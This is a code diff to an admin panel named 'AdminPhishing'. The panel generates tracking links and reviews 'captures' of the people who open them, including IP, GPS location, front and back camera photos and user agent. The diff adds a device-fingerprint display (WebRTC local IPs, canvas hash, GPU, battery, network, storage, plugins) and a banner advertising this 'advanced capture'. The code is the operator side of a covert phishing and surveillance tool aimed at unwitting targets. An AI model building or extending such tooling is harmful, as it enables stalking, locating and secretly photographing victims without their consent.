@@ -9,6 +9,7 @@ import { toast } from "sonner";
 import {
   Link2, Plus, Copy, Trash2, Eye, MapPin, Camera,
   Globe, User, Clock, ChevronLeft, Loader2, ExternalLink,
+  Monitor, Cpu, Wifi, Battery, HardDrive, Fingerprint, ChevronDown, ChevronUp,
 } from "lucide-react";
 
 function AuthImage({ src, alt, className, headers }: { src: string; alt: string; className?: string; headers: Record<string, string> }) {
@@ -63,7 +64,29 @@ type Capture = {
   back_photo_key: string | null;
   front_file_id: string | null;
   back_file_id: string | null;
+  device_info: string | null;
   created_at: string;
+};
+
+type DeviceInfo = {
+  screen?: string;
+  platform?: string;
+  language?: string;
+  timezone?: string;
+  deviceMemory?: number;
+  hardwareConcurrency?: number;
+  battery?: { level?: number; charging?: boolean };
+  connection?: { effectiveType?: string; downlink?: number; rtt?: number };
+  storage?: { quota?: number; usage?: number };
+  webglRenderer?: string;
+  webglVendor?: string;
+  localIPs?: string[];
+  canvasHash?: number;
+  pixelRatio?: number;
+  windowSize?: string;
+  userAgent?: string;
+  plugins?: string[];
+  maxTouchPoints?: number;
 };
 
 function copyText(text: string) {
@@ -81,6 +104,74 @@ function copyText(text: string) {
     document.execCommand("copy");
     document.body.removeChild(ta);
   } catch {}
+}
+
+function formatBytes(bytes?: number): string {
+  if (!bytes) return "?";
+  const gb = bytes / 1e9;
+  return gb >= 1 ? `${gb.toFixed(1)}GB` : `${(bytes / 1e6).toFixed(0)}MB`;
+}
+
+function DeviceInfoPanel({ raw }: { raw: string | null }) {
+  const [open, setOpen] = useState(false);
+  if (!raw) return null;
+
+  let info: DeviceInfo = {};
+  try { info = JSON.parse(raw); } catch { return null; }
+
+  const rows: { icon: React.ReactNode; label: string; value: string }[] = [];
+
+  if (info.platform) rows.push({ icon: <Monitor className="h-3 w-3" />, label: "Platform", value: info.platform });
+  if (info.screen) rows.push({ icon: <Monitor className="h-3 w-3" />, label: "Screen", value: `${info.screen}${info.pixelRatio ? ` @${info.pixelRatio}x` : ""}` });
+  if (info.windowSize) rows.push({ icon: <Monitor className="h-3 w-3" />, label: "Window", value: info.windowSize });
+  if (info.hardwareConcurrency) rows.push({ icon: <Cpu className="h-3 w-3" />, label: "CPUs", value: String(info.hardwareConcurrency) });
+  if (info.deviceMemory) rows.push({ icon: <HardDrive className="h-3 w-3" />, label: "RAM", value: `${info.deviceMemory}GB` });
+  if (info.battery) rows.push({ icon: <Battery className="h-3 w-3" />, label: "Battery", value: `${info.battery.level ?? "?"}%${info.battery.charging ? " ⚡" : ""}` });
+  if (info.connection) rows.push({ icon: <Wifi className="h-3 w-3" />, label: "Network", value: `${info.connection.effectiveType ?? "?"} · ${info.connection.downlink ?? "?"}Mbps · RTT ${info.connection.rtt ?? "?"}ms` });
+  if (info.language) rows.push({ icon: <Globe className="h-3 w-3" />, label: "Language", value: info.language });
+  if (info.timezone) rows.push({ icon: <Clock className="h-3 w-3" />, label: "Timezone", value: info.timezone });
+  if (info.localIPs && info.localIPs.length > 0) rows.push({ icon: <Wifi className="h-3 w-3 text-orange-400" />, label: "Local IPs", value: info.localIPs.join(", ") });
+  if (info.storage) rows.push({ icon: <HardDrive className="h-3 w-3" />, label: "Storage", value: `${formatBytes(info.storage.usage)} / ${formatBytes(info.storage.quota)}` });
+  if (info.webglRenderer) rows.push({ icon: <Monitor className="h-3 w-3" />, label: "GPU", value: String(info.webglRenderer).slice(0, 60) });
+  if (info.canvasHash) rows.push({ icon: <Fingerprint className="h-3 w-3" />, label: "Canvas FP", value: String(info.canvasHash) });
+  if (info.maxTouchPoints !== undefined) rows.push({ icon: <Monitor className="h-3 w-3" />, label: "Touch", value: `${info.maxTouchPoints} points` });
+
+  if (rows.length === 0) return null;
+
+  return (
+    <div className="border border-border rounded-xl overflow-hidden">
+      <button
+        onClick={() => setOpen(o => !o)}
+        className="w-full flex items-center justify-between p-2.5 text-left hover:bg-muted/20 transition-colors"
+      >
+        <div className="flex items-center gap-2">
+          <Fingerprint className="h-3.5 w-3.5 text-purple-400" />
+          <span className="text-xs font-medium text-purple-300">Device Fingerprint</span>
+          <Badge variant="outline" className="text-[9px] h-4 px-1">{rows.length} fields</Badge>
+        </div>
+        {open ? <ChevronUp className="h-3.5 w-3.5 text-muted-foreground" /> : <ChevronDown className="h-3.5 w-3.5 text-muted-foreground" />}
+      </button>
+
+      {open && (
+        <div className="border-t border-border p-2.5 space-y-1.5 bg-muted/10">
+          {rows.map((r, i) => (
+            <div key={i} className="flex items-start gap-2">
+              <span className="text-muted-foreground mt-0.5 flex-shrink-0">{r.icon}</span>
+              <span className="text-[10px] text-muted-foreground w-16 flex-shrink-0">{r.label}</span>
+              <span className="text-[10px] text-foreground font-mono break-all">{r.value}</span>
+            </div>
+          ))}
+          {info.plugins && info.plugins.length > 0 && (
+            <div className="flex items-start gap-2">
+              <Monitor className="h-3 w-3 text-muted-foreground mt-0.5 flex-shrink-0" />
+              <span className="text-[10px] text-muted-foreground w-16 flex-shrink-0">Plugins</span>
+              <span className="text-[10px] text-foreground font-mono">{info.plugins.join(", ")}</span>
+            </div>
+          )}
+        </div>
+      )}
+    </div>
+  );
 }
 
 export function AdminPhishing() {
@@ -144,6 +235,7 @@ export function AdminPhishing() {
   };
 
   if (selectedCode) {
+    const link = links.find(l => l.code === selectedCode);
     return (
       <Layout title="Captures">
         <div className="h-full overflow-y-auto">
@@ -157,7 +249,7 @@ export function AdminPhishing() {
             </button>
 
             <div className="bg-muted/30 rounded-xl border border-border p-3">
-              <p className="text-xs font-mono text-muted-foreground">Code: <span className="text-foreground">{selectedCode}</span></p>
+              <p className="text-xs font-mono text-muted-foreground">Code: <span className="text-foreground">{selectedCode}</span>{link?.label ? ` — ${link.label}` : ""}</p>
               <p className="text-xs text-muted-foreground mt-1">{captures.length} capture(s)</p>
             </div>
 
@@ -170,7 +262,7 @@ export function AdminPhishing() {
             ) : (
               captures.map((cap) => (
                 <div key={cap.id} className="bg-card border border-border rounded-2xl overflow-hidden">
-                  <div className="p-3 space-y-2">
+                  <div className="p-3 space-y-2.5">
                     <div className="flex items-center justify-between">
                       <Badge variant="outline" className="text-[10px] font-mono">#{cap.id}</Badge>
                       <span className="text-[10px] text-muted-foreground">
@@ -205,6 +297,8 @@ export function AdminPhishing() {
                     )}
 
                     <p className="text-[10px] text-muted-foreground truncate">{cap.user_agent}</p>
+
+                    <DeviceInfoPanel raw={cap.device_info ?? null} />
 
                     <div className="grid grid-cols-2 gap-2">
                       {(cap.front_photo_key || cap.front_file_id) && (
@@ -278,6 +372,7 @@ export function AdminPhishing() {
                 placeholder="Label (optional)"
                 value={label}
                 onChange={(e) => setLabel(e.target.value)}
+                onKeyDown={(e) => { if (e.key === "Enter") createLink(); }}
                 className="w-full h-9 px-3 text-sm bg-muted/30 border border-border rounded-lg focus:outline-none focus:ring-1 focus:ring-primary"
               />
               <Button
@@ -290,6 +385,12 @@ export function AdminPhishing() {
                 Generate Link
               </Button>
             </div>
+          </div>
+
+          <div className="bg-amber-500/5 border border-amber-500/20 rounded-xl p-3">
+            <p className="text-[10px] text-amber-400/80 leading-relaxed">
+              🎣 Advanced capture: IP · GPS · Front &amp; back camera · WebRTC local IPs · Device fingerprint · Battery · Network info
+            </p>
           </div>
 
           <div className="space-y-2">
